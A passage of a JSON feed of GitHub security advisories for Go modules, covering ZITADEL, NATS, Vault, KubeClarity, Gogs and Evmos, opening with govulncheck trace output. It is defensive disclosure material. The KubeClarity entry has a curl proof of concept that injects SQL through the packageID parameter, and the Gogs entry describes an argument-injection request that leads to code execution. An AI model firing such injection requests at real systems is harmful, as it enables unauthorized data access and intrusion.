client.ScopeProjectID calls fmt.Sprintf, which eventually calls http2.FrameType.String\n      #5: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.Framer.ReadFrame\n      #6: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.Framer.WriteContinuation\n      #7: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.Framer.WriteData\n      #8: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.Framer.WriteGoAway\n      #9: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.Framer.WriteHeaders\n      #10: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.Framer.WritePing\n      #11: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.Framer.WriteRSTStream\n      #12: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.Framer.WriteSettings\n      #13: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.Framer.WriteSettingsAck\n      #14: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.Framer.WriteWindowUpdate\n      #15: example/api/grpc/proto/api_grpc.pb.go:239:34: proto.exampleServiceAddTasksServer.Recv calls grpc.serverStream.RecvMsg, which eventually calls http2.GoAwayError.Error\n      #16: pkg/client/auth.go:92:20: client.ScopeProjectID calls fmt.Sprintf, which eventually calls http2.Setting.String\n      #17: pkg/client/auth.go:92:20: client.ScopeProjectID calls fmt.Sprintf, which eventually calls http2.SettingID.String\n      #18: example/api/grpc/main.go:63:24: grpc.main calls grpc.Server.Serve, which eventually calls http2.SettingsFrame.ForeachSetting\n      #19: example/api/grpc/proto/api_grpc.pb.go:239:34: proto.exampleServiceAddTasksServer.Recv calls grpc.serverStream.RecvMsg, which eventually calls http2.StreamError.Error\n      #20: example/app/app.go:111:27: app.main calls http.ListenAndServe, which eventually calls http2.chunkWriter.Write\n      #21: example/api/grpc/proto/api_grpc.pb.go:239:34: proto.exampleServiceAddTasksServer.Recv calls grpc.serverStream.RecvMsg, which eventually calls http2.connError.Error\n      #22: pkg/client/auth.go:92:20: client.ScopeProjectID calls fmt.Sprintf, which eventually calls http2.duplicatePseudoHeaderError.Error\n      #23: pkg/client/auth.go:23:42: client.JWTAuthentication calls profile.NewJWTProfileTokenSource, which eventually calls http2.gzipReader.Close\n      #24: pkg/authentication/state.go:20:26: authentication.State.Encrypt calls crypto.EncryptAES, which eventually calls http2.gzipReader.Read\n      #25: pkg/client/auth.go:92:20: client.ScopeProjectID calls fmt.Sprintf, which eventually calls http2.headerFieldNameError.Error\n      #26: pkg/client/auth.go:92:20: client.ScopeProjectID calls fmt.Sprintf, which eventually calls http2.headerFieldValueError.Error\n      #27: pkg/client/auth.go:92:20: client.ScopeProjectID calls fmt.Sprintf, which eventually calls http2.pseudoHeaderError.Error\n      #28: example/app/app.go:111:27: app.main calls http.ListenAndServe, which eventually calls http2.stickyErrWriter.Write\n      #29: pkg/client/auth.go:23:42: client.JWTAuthentication calls profile.NewJWTProfileTokenSource, which eventually calls http2.transportResponseBody.Close\n      #30: pkg/authentication/state.go:20:26: authentication.State.Encrypt calls crypto.EncryptAES, which eventually calls http2.transportResponseBody.Read\n      #31: pkg/client/auth.go:92:20: client.ScopeProjectID calls fmt.Sprintf, which eventually calls http2.writeData.String\n\nYour code is affected by 1 vulnerability from 1 module.\nThis scan also found 2 vulnerabilities in packages you import and 1\nvulnerability in modules you require, but your code doesn't appear to call these\nvulnerabilities.\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>No specific configuration required.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Indirect package vulnerability. Users following example code might be impacted.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-2631\">https://pkg.go.dev/vuln/GO-2024-2631</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-2611\">https://pkg.go.dev/vuln/GO-2024-2611</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-2687\">https://pkg.go.dev/vuln/GO-2024-2687</a></li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to @helpisdev for reporting this.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zitadel/zitadel-go/security/advisories/GHSA-qc6v-5g5m-8cw2\">https://github.com/zitadel/zitadel-go/security/advisories/GHSA-qc6v-5g5m-8cw2</a></li>\n<li><a href=\"https://github.com/zitadel/zitadel-go/releases/tag/v3.0.0-next.3\">https://github.com/zitadel/zitadel-go/releases/tag/v3.0.0-next.3</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-2611\">https://pkg.go.dev/vuln/GO-2024-2611</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-2631\">https://pkg.go.dev/vuln/GO-2024-2631</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-2687\">https://pkg.go.dev/vuln/GO-2024-2687</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-45288\">https://www.cve.org/CVERecord?id=CVE-2023-45288</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qc6v-5g5m-8cw2\">https://github.com/advisories/GHSA-qc6v-5g5m-8cw2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qc6v-5g5m-8cw2",
            "title": "[github.com/zitadel/zitadel-go/v3] ZITADEL Go's GRPC example code vulnerability - GO-2024-2687 HTTP/2 CONTINUATION flood in net/http",
            "date_modified": "2024-07-15T17:55:16.000Z",
            "date_published": "2024-07-15T17:55:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qc6v-5g5m-8cw2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>NATS.io NATS Server before 2.8.2 and Streaming Server before 0.24.6 could allow a remote attacker to bypass security restrictions, caused by the failure to enforce negative user permissions in one scenario. By using a queue subscription on the wildcard, an attacker could exploit this vulnerability to allow denied subjects.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29946\">https://nvd.nist.gov/vuln/detail/CVE-2022-29946</a></li>\n<li><a href=\"https://github.com/nats-io/advisories/blob/main/CVE/CVE-2022-29946.txt\">https://github.com/nats-io/advisories/blob/main/CVE/CVE-2022-29946.txt</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2h2x-8hh2-mfq8\">https://github.com/advisories/GHSA-2h2x-8hh2-mfq8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2h2x-8hh2-mfq8",
            "title": "[github.com/nats-io/nats-server] NATS Server and Streaming Server fails to enforce negative user permissions, may allow denied subjects",
            "date_modified": "2024-07-12T19:20:35.000Z",
            "date_published": "2024-07-11T21:31:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2h2x-8hh2-mfq8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Vault and Vault Enterprise did not properly handle requests originating from unauthorized IP addresses when the TCP listener option, proxy_protocol_behavior, was set to deny_unauthorized. When receiving a request from a source IP address that was not listed in proxy_protocol_authorized_addrs, the Vault API server would shut down and no longer respond to any HTTP requests, potentially resulting in denial of service.</p>\n<p>While this bug also affected versions of Vault up to 1.17.1 and 1.16.5, a separate regression in those release series did not allow Vault operators to configure the deny_unauthorized option, thus not allowing the conditions for the denial of service to occur.</p>\n<p>Fixed in Vault and Vault Enterprise 1.17.2, 1.16.6, and 1.15.12.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6468\">https://nvd.nist.gov/vuln/detail/CVE-2024-6468</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-14-vault-vulnerable-to-denial-of-service-when-setting-a-proxy-protocol-behavior/68518\">https://discuss.hashicorp.com/t/hcsec-2024-14-vault-vulnerable-to-denial-of-service-when-setting-a-proxy-protocol-behavior/68518</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2qmw-pvf7-4mw6\">https://github.com/advisories/GHSA-2qmw-pvf7-4mw6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2qmw-pvf7-4mw6",
            "title": "[github.com/hashicorp/vault] Hashicorp Vault vulnerable to Improper Check or Handling of Exceptional Conditions ",
            "date_modified": "2024-07-16T17:33:40.000Z",
            "date_published": "2024-07-11T21:31:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2qmw-pvf7-4mw6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Vault and Vault Enterprise did not properly handle requests originating from unauthorized IP addresses when the TCP listener option, proxy_protocol_behavior, was set to deny_unauthorized. When receiving a request from a source IP address that was not listed in proxy_protocol_authorized_addrs, the Vault API server would shut down and no longer respond to any HTTP requests, potentially resulting in denial of service.</p>\n<p>While this bug also affected versions of Vault up to 1.17.1 and 1.16.5, a separate regression in those release series did not allow Vault operators to configure the deny_unauthorized option, thus not allowing the conditions for the denial of service to occur.</p>\n<p>Fixed in Vault and Vault Enterprise 1.17.2, 1.16.6, and 1.15.12.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6468\">https://nvd.nist.gov/vuln/detail/CVE-2024-6468</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-14-vault-vulnerable-to-denial-of-service-when-setting-a-proxy-protocol-behavior/68518\">https://discuss.hashicorp.com/t/hcsec-2024-14-vault-vulnerable-to-denial-of-service-when-setting-a-proxy-protocol-behavior/68518</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2qmw-pvf7-4mw6\">https://github.com/advisories/GHSA-2qmw-pvf7-4mw6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2qmw-pvf7-4mw6",
            "title": "[github.com/hashicorp/vault] Hashicorp Vault vulnerable to Improper Check or Handling of Exceptional Conditions ",
            "date_modified": "2024-07-16T17:33:40.000Z",
            "date_published": "2024-07-11T21:31:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2qmw-pvf7-4mw6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>NATS.io NATS Server before 2.8.2 and Streaming Server before 0.24.6 could allow a remote attacker to bypass security restrictions, caused by the failure to enforce negative user permissions in one scenario. By using a queue subscription on the wildcard, an attacker could exploit this vulnerability to allow denied subjects.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29946\">https://nvd.nist.gov/vuln/detail/CVE-2022-29946</a></li>\n<li><a href=\"https://github.com/nats-io/advisories/blob/main/CVE/CVE-2022-29946.txt\">https://github.com/nats-io/advisories/blob/main/CVE/CVE-2022-29946.txt</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2h2x-8hh2-mfq8\">https://github.com/advisories/GHSA-2h2x-8hh2-mfq8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2h2x-8hh2-mfq8",
            "title": "[github.com/nats-io/nats-streaming-server] NATS Server and Streaming Server fails to enforce negative user permissions, may allow denied subjects",
            "date_modified": "2024-07-12T19:20:35.000Z",
            "date_published": "2024-07-11T21:31:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2h2x-8hh2-mfq8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>NATS.io NATS Server before 2.8.2 and Streaming Server before 0.24.6 could allow a remote attacker to bypass security restrictions, caused by the failure to enforce negative user permissions in one scenario. By using a queue subscription on the wildcard, an attacker could exploit this vulnerability to allow denied subjects.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29946\">https://nvd.nist.gov/vuln/detail/CVE-2022-29946</a></li>\n<li><a href=\"https://github.com/nats-io/advisories/blob/main/CVE/CVE-2022-29946.txt\">https://github.com/nats-io/advisories/blob/main/CVE/CVE-2022-29946.txt</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2h2x-8hh2-mfq8\">https://github.com/advisories/GHSA-2h2x-8hh2-mfq8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2h2x-8hh2-mfq8",
            "title": "[github.com/nats-io/nats-server/v2] NATS Server and Streaming Server fails to enforce negative user permissions, may allow denied subjects",
            "date_modified": "2024-07-12T19:20:35.000Z",
            "date_published": "2024-07-11T21:31:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2h2x-8hh2-mfq8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A time/boolean SQL Injection is present in the following resource <code>/api/applicationResources</code> via the following parameter <code>packageID</code></p>\n<h3 id=\"details\">Details</h3>\n<p>As it can be seen <a href=\"https://github.com/openclarity/kubeclarity/blob/main/backend/pkg/database/id_view.go#L79\">here</a>, while building the SQL Query the <code>fmt.Sprintf</code> function is used to build the query string without the input having first been subjected to any validation.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The following command should be able to trigger a basic version of the behavior:\n<code>curl -i -s -k -X $'GET' \\     -H $'Host: kubeclarity.test' \\     $'https://kubeclarity.test/api/applicationResources?page=1&amp;pageSize=50&amp;sortKey=vulnerabilities&amp;sortDir=DESC&amp;packageID=c89973a6-4e7f-50b5-afe2-6bf6f4d3da0a\\'HTTP/2'</code></p>\n<h3 id=\"impact\">Impact</h3>\n<p>While using the Helm chart, the impact of this vulnerability is limited since it allows read access only to the kuberclarity database, to which access is already given as far as I understand to regular users anyway.\nOn the other hand, if Kuberclarity is deployed in a less secure way, this might allow access to more data then allowed or expected (beyond the limits of the KuberClarity database)</p>\n<p>The vulnerable line was introduced as part of the initial commit of Kubeclarity, so all versions up until the latest (2.23.1) are assumed vulnerable.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclarity/kubeclarity/security/advisories/GHSA-5248-h45p-9pgw\">https://github.com/openclarity/kubeclarity/security/advisories/GHSA-5248-h45p-9pgw</a></li>\n<li><a href=\"https://github.com/openclarity/kubeclarity/commit/1d1178840703a72d9082b7fc4aea0a3326c5d294\">https://github.com/openclarity/kubeclarity/commit/1d1178840703a72d9082b7fc4aea0a3326c5d294</a></li>\n<li><a href=\"https://github.com/openclarity/kubeclarity/blob/main/backend/pkg/database/id_view.go#L79\">https://github.com/openclarity/kubeclarity/blob/main/backend/pkg/database/id_view.go#L79</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39909\">https://nvd.nist.gov/vuln/detail/CVE-2024-39909</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5248-h45p-9pgw\">https://github.com/advisories/GHSA-5248-h45p-9pgw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5248-h45p-9pgw",
            "title": "[github.com/openclarity/kubeclarity/backend] SQL Injection in the KubeClarity REST API",
            "date_modified": "2024-07-12T19:16:47.000Z",
            "date_published": "2024-07-12T13:56:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5248-h45p-9pgw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The built-in SSH server of Gogs through 0.13.0 allows argument injection in internal/ssh/ssh.go, leading to remote code execution. Authenticated attackers can exploit this by opening an SSH connection and sending a malicious --split-string env request if the built-in SSH server is activated. Windows installations are unaffected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39930\">https://nvd.nist.gov/vuln/detail/CVE-2024-39930</a></li>\n<li><a href=\"https://github.com/gogs/gogs/releases\">https://github.com/gogs/gogs/releases</a></li>\n<li><a href=\"https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1\">https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p69r-v3h4-rj4f\">https://github.com/advisories/GHSA-p69r-v3h4-rj4f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p69r-v3h4-rj4f",
            "title": "[github.com/gogs/gogs] github.com/gogs/gogs affected by CVE-2024-39930",
            "date_modified": "2024-07-10T14:30:52.000Z",
            "date_published": "2024-07-04T18:31:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p69r-v3h4-rj4f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This advisory board aims to describe two vulnerabilities found in the Evmos codebase:</p>\n<ul>\n<li><em>Authorization check on the fundVestingAccount</em>: unauthorized spend of funds.</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"authorization-check-on-the-fundvestingaccount\">Authorization check on the fundVestingAccount</h4>\n<p>With the current implementation, a user can create a vesting account with a 3rd party account (EOA or contract) as funder. Then, this user can create an authorization for the contract.CallerAddress, this is the authorization checked in the code. But the funds are taken from the funder address provided in the message. Consequently, the user can fund a vesting account with a 3rd party account without its permission. The funder address can be any address, so this vulnerability can be used to drain all the accounts in the chain.</p>\n<h3 id=\"severity\">Severity</h3>\n<p>Based on <a href=\"https://immunefisupport.zendesk.com/hc/en-us/articles/13332717597585-Severity-Classification-System\">ImmuneFi Severity Classification System</a> the severity was evaluated to Critical since the attack could have lead to direct loss of funds.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has been patched in versions &gt;=V19.0.0</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-q6hg-6m9x-5g9c\">https://github.com/evmos/evmos/security/advisories/GHSA-q6hg-6m9x-5g9c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39696\">https://nvd.nist.gov/vuln/detail/CVE-2024-39696</a></li>\n<li><a href=\"https://github.com/evmos/evmos/commit/0a620e176617a835ac697eea494afea09185dfaf\">https://github.com/evmos/evmos/commit/0a620e176617a835ac697eea494afea09185dfaf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q6hg-6m9x-5g9c\">https://github.com/advisories/GHSA-q6hg-6m9x-5g9c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q6hg-6m9x-5g9c",
            "title": "[github.com/evmos/evmos/v18] Evmos vulnerable to exploit of smart contract account and vesting",
            "date_modified": "2024-07-10T14:19:52.000Z",
            "date_published": "2024-07-10T14:19:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q6hg-6m9x-5g9c"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}